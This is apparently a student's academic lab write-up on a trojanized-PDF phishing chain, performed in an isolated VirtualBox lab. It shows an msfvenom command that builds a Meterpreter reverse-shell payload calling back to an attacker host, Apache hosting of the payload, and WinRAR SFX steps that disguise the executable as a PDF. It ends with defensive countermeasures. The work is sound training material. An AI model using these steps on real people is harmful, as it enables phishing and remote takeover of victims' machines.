# Weekly Lab — Payload Delivery & Social Engineering Attack Simulation

> **Disclaimer:** All tasks were performed exclusively in an isolated VirtualBox lab environment
> (Host-Only network). No real systems were targeted. This is academic coursework documentation.

---

## Lab Overview

| Detail | Info |
|--------|------|
| Environment | VirtualBox — Host-Only Network |
| Attacker Machine | Kali Linux |
| Target Machine | Windows (Victim VM) |
| Tools Used | msfvenom, Apache2, WinRAR SFX, Metasploit |
| Topic | Payload Generation + Social Engineering Delivery |

---

## Objective

Understand how attackers disguise malicious executables as legitimate-looking PDF files
to trick users into executing payloads — a common real-world phishing technique.

---

## Task 2 — Trojanized PDF Attack Chain

### Step 1: Payload Generation with msfvenom

Generated a Windows reverse TCP Meterpreter payload.

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<attacker-ip> \
  LPORT=2222 \
  -f exe -o payload.exe
```

**Output:**
- Payload size: 354 bytes
- Final EXE size: 7168 bytes
- Payload type: Meterpreter reverse shell

---

### Step 2: Hosting Payload via Apache2 Web Server

Moved the payload to the Apache web root and started the web service so the victim VM
could download it over the local network.

```bash
mv payload.exe /var/www/html/
service apache2 start
service apache2 status
```

**Result:** Apache2 confirmed active and running — payload accessible via HTTP.

---

### Step 3: PDF Trojan Creation (File Disguising Technique)

Used WinRAR SFX (Self-Extracting Archive) feature to bundle:
- A legitimate-looking PDF file (`Hunza_Plan.pdf`)
- The malicious executable (`Hunza.exe`)

Into a single archive named `Hunza_Plan.pdf.exe` — which visually appears as a PDF.

**SFX Configuration used:**
- Archive format: RAR → SFX archive
- Run after extraction: `Hunza_Plan.pdf` + `Hunza.exe`
- Overwrite mode: Overwrite all files
- Logo/icon: PDF icon loaded to complete the disguise

**Result:** Final file `Hunza_Plan.pdf` created — looks like a PDF, executes payload silently.

---

### Step 4: Delivery & Execution on Victim Machine

Victim downloaded the disguised file from the attacker's Apache server.
Upon opening, the PDF opened normally while the payload executed in background.

---

## Attack Chain Summary

```
msfvenom → payload.exe
     ↓
Apache2 → HTTP delivery to victim
     ↓
WinRAR SFX → bundle payload + decoy PDF
     ↓
Victim opens "PDF" → payload executes silently
     ↓
Meterpreter reverse shell → attacker gains access
```

---

## Concepts Learned

| Concept | Description |
|---------|-------------|
| Payload Generation | msfvenom for creating staged reverse shells |
| Web-based Delivery | Apache2 as payload hosting server |
| File Disguising | .pdf.exe double extension spoofing |
| SFX Archives | WinRAR self-extracting for payload bundling |
| Social Engineering | Tricking user via trusted file appearance |
| Delivery Vector | Simulated phishing file delivery |

---

## Defensive Countermeasures (Blue Team Perspective)

- **Email/web filtering** — Block executable file types disguised as documents
- **File extension validation** — Force OS to show real file extensions (disable "Hide extensions")
- **Antivirus / EDR** — Detect msfvenom signatures at download and execution stage
- **User awareness training** — Train users to verify file sources before opening
- **Application whitelisting** — Block unauthorized executables from running
- **Network monitoring** — Detect unusual outbound connections (reverse shell traffic)
- **Disable AutoRun** — Prevent automatic execution of downloaded files


---

## Key Takeaway

> This lab demonstrates why **user awareness training** is one of the most critical
> defensive controls. Even strong technical defenses can be bypassed if a user
> willingly opens a disguised malicious file. Security = Technology + Human Awareness.

---

[Muhammad Adeel Tariq .pdf](https://github.com/user-attachments/files/26320579/Muhammad.Adeel.Tariq.pdf)

*Academic Lab | Cybersecurity Course — Weekly challenge | Muhammad Adeel Tariq*
